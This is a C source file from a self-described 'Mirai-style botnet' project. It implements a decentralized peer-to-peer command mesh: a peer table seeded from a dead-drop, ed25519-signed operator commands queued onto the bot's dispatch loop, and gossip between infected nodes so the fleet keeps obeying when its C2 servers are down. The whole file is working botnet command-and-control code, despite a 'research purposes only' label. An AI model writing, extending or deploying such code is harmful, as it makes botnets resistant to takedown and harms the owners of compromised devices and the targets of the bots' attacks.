/*
 * notnet - Modern Mirai-Style Botnet
 * mesh.c - Decentralized P2P command/peer mesh (#139)
 *
 * Research purposes only.
 *
 * Design (see issue #139):
 *   1. Peer discovery  - bounded peer table (addr:port + last-seen),
 *      seeded from config + dead-drop `peers=` field, gossiped with TTL
 *      eviction. A dedicated mesh listener accepts peer-introduced MESH
 *      frames (ed25519-signed commands) and re-verifies before requeueing.
 *   2. Signed commands - every accepted command carries an ed25519
 *      signature over the command line, verified against the operator
 *      pubkey baked at build time (MESH_OP_PUBKEY). Fail-closed: unsigned
 *      or mis-signed commands are dropped. When not compiled with signing
 *      support the module refuses ALL mesh commands (safe default).
 *   3. Hop-bounded propagation - commands propagate with TTL =
 *      MESH_HOP_MAX so they cannot loop forever; each peer re-verifies
 *      before requeuing (the relay.c multi-hop trust model, reused here
 *      for the command plane).
 *   4. C2 becomes optional - the mesh runs UNDER the existing channels;
 *      when all C2 endpoints are dead the fleet still relays commands.
 *
 * Reuses relay.c's multi-hop / token design posture and deaddrop.c's
 * "trust the payload, not the transport" principle: the MESH listener is a
 * plain token-authenticated TCP endpoint (same relay_token as the fleet),
 * but command acceptance is gated by the ed25519 signature, never by the
 * transport.
 */
#include "config.h"
#include "protocol.h"
#include "mesh.h"
#include "util.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/* ── Operator pubkey (build-time) ─────────────────────────── */
#ifndef MESH_OP_PUBKEY
#define MESH_OP_PUBKEY ""
#endif

/* ── Module state ─────────────────────────────────────────── */
static mesh_peer_t g_peers[MESH_PEER_MAX];
static pthread_mutex_t g_peer_mutex = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_mesh_running = 0;
static volatile int g_mesh_stop = 0;
static pthread_t g_mesh_thread;       /* gossip/prune loop */
static pthread_t g_listen_thread;     /* MESH frame listener */
static int g_listener_fd = -1;
static int g_mesh_port = 0;
static char g_op_pubkey_hex[MESH_OP_PUBKEY_HEX + 1] = MESH_OP_PUBKEY;
static int g_op_pubkey_valid = 0;
static notnet_bot_t *g_bot_ref = NULL;

/* #170: the mesh listen thread pushes onto bot->cmd_queue/cmd_count while
 * the main loop (protocol_process_commands) reads and compacts the same
 * array with no lock of its own. This mutex serializes mesh-side pushes;
 * protocol.c takes it around its queue processing (protocol_cmd_queue_lock
 * / _unlock below). */
static pthread_mutex_t g_cmdq_mutex = PTHREAD_MUTEX_INITIALIZER;

void mesh_cmd_queue_lock(void)   { pthread_mutex_lock(&g_cmdq_mutex); }
void mesh_cmd_queue_unlock(void) { pthread_mutex_unlock(&g_cmdq_mutex); }

/* ── Helpers ─────────────────────────────────────────────── */
static int hexval(int c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}
static int is_hex64(const char *s) {
    if (!s || strlen(s) != MESH_OP_PUBKEY_HEX) return 0;
    for (int i = 0; i < MESH_OP_PUBKEY_HEX; i++)
        if (hexval(s[i]) < 0) return 0;
    return 1;
}
static int relay_const_cmp(const unsigned char *a, int alen, const char *b) {
    int blen = (int)strlen(b);
    if (alen != blen) return 1;
    int diff = 0;
    for (int i = 0; i < alen; i++) diff |= (a[i] ^ (unsigned char)b[i]);
    return diff;
}

/* Bounded line read (CRLF/CR/LF) into buf; 0 ok, -1 timeout/overflow. */
static int mesh_recv_line(int fd, char *buf, int max, int timeout_ms) {
    int got = 0;
    while (got < max - 1) {
        fd_set rfds; FD_ZERO(&rfds); FD_SET(fd, &rfds);
        struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
        if (select(fd + 1, &rfds, NULL, NULL, &tv) <= 0) return -1;
        char c; int n = recv(fd, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c != '\r') buf[got++] = c;
    }
    if (got >= max - 1) return -1;
    buf[got] = '\0';
    return 0;
}
static int mesh_send_all(int fd, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = send(fd, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}
/* Plain blocking TCP connect (mirrors relay.c's relay_tcp_connect). */
static int mesh_tcp_connect(const char *host, uint16_t port, int timeout_ms) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    char pstr[8]; snprintf(pstr, sizeof(pstr), "%u", (unsigned)port);
    if (getaddrinfo(host, pstr, &hints, &res) != 0) return -1;
    int sock = -1;
    for (struct addrinfo *ai = res; ai; ai = ai->ai_next) {
        sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (sock < 0) continue;
        int fl = fcntl(sock, F_GETFL, 0);
        if (fl < 0 || fcntl(sock, F_SETFL, fl | O_NONBLOCK) < 0) { close(sock); sock = -1; continue; }
        int c = connect(sock, ai->ai_addr, ai->ai_addrlen);
        if (c != 0 && errno != EINPROGRESS) { close(sock); sock = -1; continue; }
        fd_set wfds; FD_ZERO(&wfds); FD_SET(sock, &wfds);
        struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
        if (select(sock + 1, NULL, &wfds, NULL, &tv) <= 0) { close(sock); sock = -1; continue; }
        int soerr = 0; socklen_t elen = sizeof(soerr);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &soerr, &elen) < 0 || soerr != 0) { close(sock); sock = -1; continue; }
        fcntl(sock, F_SETFL, fl);
        break;
    }
    freeaddrinfo(res);
    return sock;
}

/* ── Peer table ───────────────────────────────────────────── */
int mesh_add_peer(const char *host, uint16_t port) {
    if (!host || host[0] == '\0' || port == 0) return -1;
    pthread_mutex_lock(&g_peer_mutex);
    int free_slot = -1, existing = -1;
    for (int i = 0; i < MESH_PEER_MAX; i++) {
        if (g_peers[i].last_seen == 0 && free_slot < 0) free_slot = i;
        if (g_peers[i].last_seen != 0 && strcmp(g_peers[i].host, host) == 0 &&
            g_peers[i].port == port) { existing = i; break; }
    }
    int slot = (existing >= 0) ? existing : free_slot;
    if (slot < 0) {
        time_t oldest = time(NULL); slot = 0;
        for (int i = 1; i < MESH_PEER_MAX; i++)
            if (g_peers[i].last_seen < oldest) { oldest = g_peers[i].last_seen; slot = i; }
    }
    strncpy(g_peers[slot].host, host, sizeof(g_peers[slot].host) - 1);
    g_peers[slot].host[sizeof(g_peers[slot].host) - 1] = '\0';
    g_peers[slot].port = port;
    g_peers[slot].last_seen = time(NULL);
    pthread_mutex_unlock(&g_peer_mutex);
    return 0;
}
int mesh_peer_count(void) {
    int n = 0;
    pthread_mutex_lock(&g_peer_mutex);
    for (int i = 0; i < MESH_PEER_MAX; i++) if (g_peers[i].last_seen != 0) n++;
    pthread_mutex_unlock(&g_peer_mutex);
    return n;
}
int mesh_has_peers(void) { return mesh_peer_count() > 0; }
void mesh_prune_stale(void) {
    time_t now = time(NULL);
    pthread_mutex_lock(&g_peer_mutex);
    for (int i = 0; i < MESH_PEER_MAX; i++) {
        if (g_peers[i].last_seen != 0 && now - g_peers[i].last_seen > MESH_PEER_TTL) {
            log_info("MESH: evicting stale peer %s:%u", g_peers[i].host, g_peers[i].port);
            g_peers[i].last_seen = 0;
        }
    }
    pthread_mutex_unlock(&g_peer_mutex);
}

/* Parse "host:port,host:port" peer-seed list from dead-drop `peers=`. */
int mesh_seed_from_blob(const char *body) {
    if (!body) return -1;
    const char *p = strstr(body, "peers=");
    if (!p) return -1;
    const char *val = p + 6;
    char buf[2048]; int bi = 0;
    while (*val && *val != '&' && *val != '\n' && *val != '\r' && bi < (int)sizeof(buf) - 1)
        buf[bi++] = *val++;
    buf[bi] = '\0';
    int added = 0;
    char *save = NULL;
    char *tok = strtok_r(buf, ",", &save);
    while (tok) {
        char hv[256] = {0}; unsigned int hp = 0;
        if (sscanf(tok, "%255[^:]:%u", hv, &hp) == 2 && hp >= 1 && hp <= 65535)
            if (mesh_add_peer(hv, (uint16_t)hp) == 0) added++;
        tok = strtok_r(NULL, ",", &save);
    }
    if (added) log_info("MESH: seeded %d peer(s) from dead-drop blob", added);
    return added;
}

/* ── ed25519 verify (MESH_ED25519 builds only) ──────────── */
#ifdef MESH_ED25519
#include <openssl/evp.h>
static int ed25519_verify(const unsigned char *sig, const unsigned char *msg,
                          size_t msglen, const unsigned char *pub) {
    EVP_PKEY *pkey = EVP_PKEY_new_raw_public_key(EVP_PKEY_ED25519, NULL, pub, 32);
    if (!pkey) return -1;
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    if (!ctx) { EVP_PKEY_free(pkey); return -1; }
    int ok = EVP_DigestVerifyInit(ctx, NULL, NULL, NULL, pkey);
    if (ok == 1) ok = EVP_DigestVerify(ctx, sig, 64, msg, msglen);
    EVP_MD_CTX_free(ctx);
    EVP_PKEY_free(pkey);
    return (ok == 1) ? 1 : 0;
}
#endif

/* ── Signed command verification + queue (#139 step 2) ───── */
int mesh_verify_and_queue(notnet_bot_t *bot, const char *cmd, const char *sig_hex) {
    if (!bot || !cmd || !sig_hex) return -1;
    /* #336: canonicalize BEFORE verification — reject anything longer than
     * what a queue slot can hold so the verified bytes are exactly the
     * queued/executed bytes. Silently truncating after verify would let a
     * signed command execute as an unverified prefix of itself. */
    if (strlen(cmd) > 255) {
        log_warn("MESH: rejecting signed command — %zu bytes exceeds 255-byte queue limit",
                 strlen(cmd));
        return -1;
    }
    if (!g_op_pubkey_valid) {
        log_warn("MESH: rejecting signed command — no operator pubkey compiled in");
        return -1;
    }
#ifdef MESH_ED25519
    if (strlen(sig_hex) != 128) { log_warn("MESH: bad signature length"); return -1; }
    unsigned char sig[64], pub[32];
    for (int i = 0; i < 64; i++) {
        int hi = hexval(sig_hex[2*i]), lo = hexval(sig_hex[2*i+1]);
        if (hi < 0 || lo < 0) { log_warn("MESH: bad signature hex"); return -1; }
        sig[i] = (unsigned char)((hi << 4) | lo);
    }
    for (int i = 0; i < 32; i++) {
        int hi = hexval(g_op_pubkey_hex[2*i]), lo = hexval(g_op_pubkey_hex[2*i+1]);
        if (hi < 0 || lo < 0) { log_warn("MESH: bad pubkey hex"); return -1; }
        pub[i] = (unsigned char)((hi << 4) | lo);
    }
    if (ed25519_verify(sig, (const unsigned char *)cmd, strlen(cmd), pub) != 1) {
        log_warn("MESH: command signature verification FAILED — dropped");
        return -1;
    }
#else
    (void)sig_hex;
    log_warn("MESH: rejecting signed command — MESH_ED25519 not compiled in");
    return -1;
#endif
    /* Verified: push onto the bot's cmd_queue so the existing dispatch
     * loop executes it — the mesh never defines its own command semantics.
     * #170: guard with g_cmdq_mutex (the queue's own lock), not
     * g_peer_mutex which protects the peer table, not the queue. */
    pthread_mutex_lock(&g_cmdq_mutex);
    if (bot->cmd_count >= 256) { pthread_mutex_unlock(&g_cmdq_mutex); return -1; }
    snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", cmd);
    bot->cmd_queue[bot->cmd_count][255] = '\0';
    bot->cmd_count++;
    pthread_mutex_unlock(&g_cmdq_mutex);
    log_info("MESH: verified+queued operator command: %s", cmd);
    return 0;
}

/* ── MESH frame listener ─────────────────────────────────── */
/* Accepts token-authenticated `MESH <cmd> <sig>` frames. The token is the
 * shared relay_token (fleet-wide). On a verified command it requeues and
 * replies OK; otherwise ERR. TTL is enforced by MESH_HOP_MAX via the
 * signature being single-hop (no re-signing), so a peer can only forward
 * commands it itself verified — no unbounded relay loops. */
static void mesh_handle_conn(notnet_bot_t *bot, int client) {
    char line[RELAY_HANDSHAKE_MAX];
    if (mesh_recv_line(client, line, sizeof(line), RELAY_HANDSHAKE_TIMEOUT) != 0) {
        close(client); return;
    }
    char verb[8] = {0}, tok[64] = {0}, cmd[768] = {0}, sig[160] = {0};
    int nf = sscanf(line, "%7s %63s %159s %767[^\n]", verb, tok, sig, cmd);
    if (nf < 4 || strcmp(verb, "MESH") != 0) {
        mesh_send_all(client, "ERR BADREQ\r\n", 12); close(client); return;
    }
    if (relay_const_cmp((const unsigned char *)tok, (int)strlen(tok), bot->relay_token) != 0) {
        mesh_send_all(client, "ERR AUTH\r\n", 10); close(client); return;
    }
    if (mesh_verify_and_queue(bot, cmd, sig) == 0)
        mesh_send_all(client, "OK\r\n", 4);
    else
        mesh_send_all(client, "ERR VERIFY\r\n", 12);
    close(client);
}

static void *mesh_listen_loop(void *arg) {
    notnet_bot_t *bot = (notnet_bot_t *)arg;
    while (!g_mesh_stop) {
        fd_set rfds; FD_ZERO(&rfds);
        pthread_mutex_lock(&g_peer_mutex);
        int lfd = g_listener_fd;
        if (lfd >= 0) FD_SET(lfd, &rfds);
        pthread_mutex_unlock(&g_peer_mutex);
        if (lfd < 0) break;
        struct timeval tv = { 0, 500000 };
        int sel = select(lfd + 1, &rfds, NULL, NULL, &tv);
        if (sel < 0) { if (errno == EINTR) continue; break; }
        if (sel == 0) continue;
        struct sockaddr_in peer; socklen_t plen = sizeof(peer);
        int cfd = accept(lfd, (struct sockaddr *)&peer, &plen);
        if (cfd < 0) { if (errno == EAGAIN || errno == EINTR) continue; continue; }
        mesh_handle_conn(bot, cfd);   /* sequential; bounded line + close */
    }
    return NULL;
}

/* ── Gossip (#139 step 3) ─────────────────────────────────── */
int mesh_gossip_command(notnet_bot_t *bot, const char *cmd, const char *sig_hex) {
    if (!bot || !cmd || !sig_hex) return 0;
    int pushed = 0;
    pthread_mutex_lock(&g_peer_mutex);
    for (int i = 0; i < MESH_PEER_MAX; i++) {
        if (g_peers[i].last_seen == 0) continue;
        int fd = mesh_tcp_connect(g_peers[i].host, g_peers[i].port, RELAY_HANDSHAKE_TIMEOUT);
        if (fd < 0) continue;
        char payload[RELAY_HANDSHAKE_MAX];
        int n = snprintf(payload, sizeof(payload), "MESH %s %s %s\r\n",
                     bot->relay_token, sig_hex, cmd);
        if (n < 0 || (size_t)n >= sizeof(payload) ||
            mesh_send_all(fd, payload, n) != 0) { close(fd); continue; }
        char resp[RELAY_HANDSHAKE_MAX];
        if (mesh_recv_line(fd, resp, sizeof(resp), RELAY_HANDSHAKE_TIMEOUT) == 0 &&
            strncmp(resp, "OK", 2) == 0) {
            g_peers[i].last_seen = time(NULL);
            pushed++;
        }
        close(fd);
    }
    pthread_mutex_unlock(&g_peer_mutex);
    if (pushed) log_info("MESH: gossiped command to %d peer(s)", pushed);
    return pushed;
}

/* ── C2 optionality (#139 step 4) ────────────────────────── */
int mesh_c2_optional(notnet_bot_t *bot) {
    if (!bot) return 0;
    int c2_up = bot->c2_irc.connected || bot->c2_http.connected || bot->c2_ws.connected;
    return (!c2_up && mesh_has_peers()) ? 1 : 0;
}

/* ── Gossip/prune loop ───────────────────────────────────── */
static void *mesh_loop(void *arg) {
    (void)arg;
    while (!g_mesh_stop) {
        for (int i = 0; i < 240 && !g_mesh_stop; i++) usleep(500000);
        if (g_mesh_stop) break;
        mesh_prune_stale();
    }
    return NULL;
}

/* ── Start/stop ───────────────────────────────────────────── */
int mesh_start(notnet_bot_t *bot) {
    if (!bot) return -1;
    if (bot->mesh_operator_pubkey[0] != '\0') {
        if (!is_hex64(bot->mesh_operator_pubkey)) {
            log_warn("MESH: configured operator pubkey not 64 hex — refusing");
            return -1;
        }
        strncpy(g_op_pubkey_hex, bot->mesh_operator_pubkey, MESH_OP_PUBKEY_HEX);
        g_op_pubkey_hex[MESH_OP_PUBKEY_HEX] = '\0';
    }
    g_op_pubkey_valid = is_hex64(g_op_pubkey_hex);
    if (bot->relay_token[0] == '\0') {
        log_warn("MESH: refusing to start — no relay_token (needed for frame auth)");
        return -1;
    }

    g_mesh_port = bot->mesh_port ? bot->mesh_port : MESH_DEFAULT_PORT;

    /* Seed static peers from config. */
    for (int i = 0; i < MESH_PEER_MAX; i++) {
        if (bot->mesh_static_peers[i][0] == '\0') continue;
        char hv[256] = {0}; unsigned int hp = 0;
        if (sscanf(bot->mesh_static_peers[i], "%255[^:]:%u", hv, &hp) == 2 &&
            hp >= 1 && hp <= 65535)
            mesh_add_peer(hv, (uint16_t)hp);
    }

    pthread_mutex_lock(&g_peer_mutex);
    if (g_mesh_running) { pthread_mutex_unlock(&g_peer_mutex); return 0; }

    int lfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (lfd < 0) { pthread_mutex_unlock(&g_peer_mutex); return -1; }
    int one = 1; setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa; memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    if (bot->mesh_bind[0] != '\0') {
        /* SECURITY FIX (#295): least-privilege bind. A configured but
         * unparseable address refuses to start (never fall back to
         * 0.0.0.0 — that would silently widen the listener). */
        if (inet_pton(AF_INET, bot->mesh_bind, &sa.sin_addr) != 1) {
            log_warn("MESH: invalid mesh_bind='%s' — refusing to start",
                     bot->mesh_bind);
            close(lfd); pthread_mutex_unlock(&g_peer_mutex); return -1;
        }
    } else {
        sa.sin_addr.s_addr = htonl(INADDR_ANY);
    }
    sa.sin_port = htons((uint16_t)g_mesh_port);
    if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        log_warn("MESH: bind 0.0.0.0:%u failed: %s", (unsigned)g_mesh_port, strerror(errno));
        close(lfd); pthread_mutex_unlock(&g_peer_mutex); return -1;
    }
    if (listen(lfd, 32) < 0) {
        log_warn("MESH: listen failed: %s", strerror(errno));
        close(lfd); pthread_mutex_unlock(&g_peer_mutex); return -1;
    }
    g_listener_fd = lfd;
    g_mesh_stop = 0;
    g_bot_ref = bot;
    if (pthread_create(&g_listen_thread, NULL, mesh_listen_loop, bot) != 0) {
        close(lfd); g_listener_fd = -1; pthread_mutex_unlock(&g_peer_mutex); return -1;
    }
    if (pthread_create(&g_mesh_thread, NULL, mesh_loop, NULL) != 0) {
        g_mesh_stop = 1; close(lfd); g_listener_fd = -1;
        pthread_mutex_unlock(&g_peer_mutex); return -1;
    }
    g_mesh_running = 1;
    pthread_mutex_unlock(&g_peer_mutex);

    log_info("MESH: peer mesh started on 0.0.0.0:%u (%d seed peer(s), operator pubkey %s)",
             (unsigned)g_mesh_port, mesh_peer_count(),
             g_op_pubkey_valid ? "set" : "MISSING/fail-closed");
    return 0;
}

void mesh_stop(void) {
    pthread_mutex_lock(&g_peer_mutex);
    if (!g_mesh_running) { pthread_mutex_unlock(&g_peer_mutex); return; }
    g_mesh_stop = 1;
    int lfd = g_listener_fd; g_listener_fd = -1;
    pthread_mutex_unlock(&g_peer_mutex);
    if (lfd >= 0) close(lfd);
    pthread_join(g_listen_thread, NULL);
    pthread_join(g_mesh_thread, NULL);
    pthread_mutex_lock(&g_peer_mutex);
    g_mesh_running = 0;
    pthread_mutex_unlock(&g_peer_mutex);
    log_info("MESH: peer mesh stopped");
}

int mesh_is_running(void) {
    pthread_mutex_lock(&g_peer_mutex);
    int r = g_mesh_running;
    pthread_mutex_unlock(&g_peer_mutex);
    return r;
}
